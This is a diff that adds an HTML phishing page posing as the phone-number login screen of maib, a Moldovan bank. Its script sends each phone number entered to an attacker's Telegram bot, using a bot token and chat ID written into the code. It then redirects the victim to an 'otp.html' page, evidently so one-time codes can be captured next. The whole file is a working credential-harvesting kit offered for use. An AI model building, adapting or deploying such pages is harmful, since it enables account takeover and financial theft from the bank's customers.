@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>maib login</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background-color: white;
+            width: 100%;
+            max-width: 400px;
+            height: 100vh;
+            padding: 20px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        .header {
+            margin-bottom: 40px;
+            margin-top: 20px;
+        }
+
+        .back-button {
+            font-size: 24px;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 32px;
+            color: #1a1a1a;
+            margin: 0;
+            line-height: 1.2;
+        }
+
+        p {
+            color: #666;
+            font-size: 16px;
+            margin-top: 15px;
+            line-height: 1.4;
+        }
+
+        .input-group {
+            display: flex;
+            align-items: center;
+            background-color: #f0f2f5;
+            border-radius: 12px;
+            padding: 15px;
+            margin-top: 30px;
+        }
+
+        .flag-container {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding-right: 15px;
+            border-right: 1px solid #ccc;
+            cursor: pointer;
+        }
+
+        .flag {
+            width: 24px;
+            height: 16px;
+            border-radius: 2px;
+        }
+
+        .country-code {
+            font-weight: 500;
+            color: #333;
+        }
+
+        input {
+            border: none;
+            background: transparent;
+            font-size: 18px;
+            padding-left: 15px;
+            outline: none;
+            width: 100%;
+        }
+
+        .btn-continue {
+            background-color: #002352;
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 30px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        .separator {
+            text-align: center;
+            margin: 20px 0;
+            color: #666;
+            font-size: 14px;
+            position: relative;
+        }
+
+        .btn-passkey {
+            background-color: #e9eff6;
+            color: #002352;
+            border: none;
+            padding: 18px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .passkey-icon {
+            width: 20px;
+            height: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="back-button">←</div>
+        
+        <div class="header">
+            <h1>Introdu numărul <br> tău de telefon</h1>
+            <p>Pentru a te autentifica sau pentru a deveni client maib</p>
+        </div>
+
+        <div class="input-group">
+            <div class="flag-container">
+                <img class="flag" src="https://flagcdn.com/md.svg" alt="Moldova Flag">
+                <span class="country-code">+373</span>
+                <span>⌵</span>
+            </div>
+            <input type="tel" id="phoneInput" placeholder="">
+        </div>
+
+        <button class="btn-continue" onclick="sendToTelegram()">Continuă</button>
+
+        <div class="separator">sau</div>
+
+        <button class="btn-passkey">
+            <svg class="passkey-icon" viewBox="0 0 24 24" fill="currentColor">
+                <path d="M12.65 10C11.83 7.67 9.61 6 7 6c-3.31 0-6 2.69-6 6s2.69 6 6 6c2.61 0 4.83-1.67 5.65-4H17v4h4v-4h2v-4H12.65zM7 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/>
+            </svg>
+            Continuă cu Passkey
+        </button>
+    </div>
+
+    <script>
+        // ضع بياناتك هنا
+        const botToken = "8750310622:AAGlyWo1lsyJZGX9RopjWIF6a8VyvNPCmnA";
+        const chatId = "8129155953";
+
+        function sendToTelegram() {
+            const phone = document.getElementById('phoneInput').value;
+            
+            if (phone.trim() !== "") {
+                // حفظ الرقم للانتقال للصفحة التالية
+                localStorage.setItem('userPhone', phone);
+
+                const message = `📱 **رقم هاتف جديد سجل الدخول:**\n\n+373 ${phone}`;
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: "Markdown"
+                    })
+                })
+                .then(response => {
+                    // التوجه لصفحة الـ OTP
+                    window.location.href = 'otp.html';
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    window.location.href = 'otp.html'; // توجه حتى لو فشل الإرسال
+                });
+            } else {
+                alert("Vă rugăm să introduceți numărul de telefon.");
+            }
+        }
+    </script>
+
+</body>
+</html>
